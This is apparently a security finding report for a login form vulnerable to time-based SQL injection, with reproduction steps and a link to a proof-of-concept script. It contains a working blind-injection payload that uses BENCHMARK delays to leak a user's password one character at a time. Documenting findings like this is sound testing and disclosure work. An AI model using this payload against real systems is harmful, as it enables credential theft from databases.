# Vulnerability 7: SQL Injection allows with network delays to check values from the DB (e.g a char from a password)

- Vulnerability: SQL Injection - timing attack
- Where: Field `Username` in login form 
- Impact: Allows to check a value from the DB (e.g 1st char from a password) using network delays

# Steps to reproduce

1. Insert into the field `Username`: `' UNION SELECT 1, 2, 3, 4, IF(SUBSTRING( password , 1, 1) = 'h', BENCHMARK(5000000, ENCODE('MSG', 'by 5 seconds')), null) FROM Users WHERE username= 'darfo' -- `
2. Check the time it takes to process
3. If it takes more than 3 seconds then the value is correct
4. If not, then the value is incorrect

[(PoC)](SQLvuln7.py)